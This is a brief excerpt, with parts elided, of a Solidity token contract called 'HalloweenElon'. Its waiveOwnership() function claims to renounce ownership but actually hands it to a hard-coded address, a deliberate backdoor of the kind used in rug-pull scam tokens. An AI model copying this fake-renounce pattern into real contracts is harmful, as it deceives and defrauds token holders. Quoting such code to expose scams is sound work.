...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x134903F44F20062a49ae0b8b5e0591e316fe2607));
        _owner = address(0x134903F44F20062a49ae0b8b5e0591e316fe2607);
    }
...
contract HalloweenElon is Context, IERC20, Ownable {
    ...
    string private _name = "HalloweenElon";
